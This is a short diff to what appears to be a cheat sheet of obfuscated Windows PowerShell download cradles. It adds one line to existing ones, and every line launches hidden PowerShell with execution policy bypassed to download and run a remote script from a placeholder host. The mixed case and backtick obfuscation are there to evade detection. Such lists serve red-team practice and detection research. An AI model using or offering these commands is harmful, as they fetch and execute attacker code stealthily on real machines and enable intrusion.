@@ -2,6 +2,7 @@
 # Windows Command Shell download cradles, not proxy aware ligthly obfuscated 
 cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://server/payload.ps1\")"
 cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://server/payload.ps1\")"
+cmd> POWErshelL  -NoPRofi -WiNdoWSTYL  hidd -EXecUTiOnPO BYpASS -cO  "i`EX (    neW-o`BJE`cT N`ET.`weBcl`IeNT    ).\"do`wnLO`ADS`TRinG\"(    \"http://server/payload.ps1\"   )"
 
 # Windows Command Shell download cradles, not proxy aware obfuscated
 cmd> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
